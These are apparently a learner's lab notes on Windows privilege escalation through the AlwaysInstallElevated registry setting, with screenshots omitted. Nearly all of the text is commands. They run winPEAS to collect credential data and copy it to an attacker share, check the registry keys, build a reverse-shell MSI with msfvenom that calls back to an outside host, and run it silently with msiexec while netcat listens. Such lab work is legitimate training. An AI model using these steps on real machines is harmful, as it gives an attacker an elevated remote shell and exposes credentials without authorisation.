1x5 Registry - AlwaysInstallElevated

## Registry - AlwaysInstallElevated 

```bash
.\winPEASany.exe ansi quiet windowscreds > wpeas_wincreds_op.txt
copy C:\PrivEsc\wpeas_wincreds_op.txt \\10.9.4.127\kali\wpeas_wincreds_op.txt
cat wpeas_wincreds_op.txt
```
![4b363d0fe3806f9f44a0959f9c0f09ac.png](../_resources/4fde60d39c62403c8e1d71d976ccea9f.png)

```console
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
![379c68aa4cf9ce1c4c9220ca8c1ad96a.png](../_resources/64e9b52cc678416ba4af01f192516c19.png)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.4.127 LPORT=53 -f msi -o reverse.msi
```
![163f65c28d5b51575c42ddc4053d9192.png](../_resources/6959611c24484dc38e45736c2262ec2c.png)
```bash
copy \\10.9.4.127\kali\reverse.msi C:\PrivEsc\reverse.msi
```
![728a95b210e9d9dd00968e96e13b2865.png](../_resources/a89e8c8bcb10410caa627c361ce94081.png)

```bash
sudo nc -nvlp 53
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```
![99edd33ff49eeff26a75e9c04794febe.png](../_resources/cc92ef3e29394d56a5bde06fbd4209d3.png)
